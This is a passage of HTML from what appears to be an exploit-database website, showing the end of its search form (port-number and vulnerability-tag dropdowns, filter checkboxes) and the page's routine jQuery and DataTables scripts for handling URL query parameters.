                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
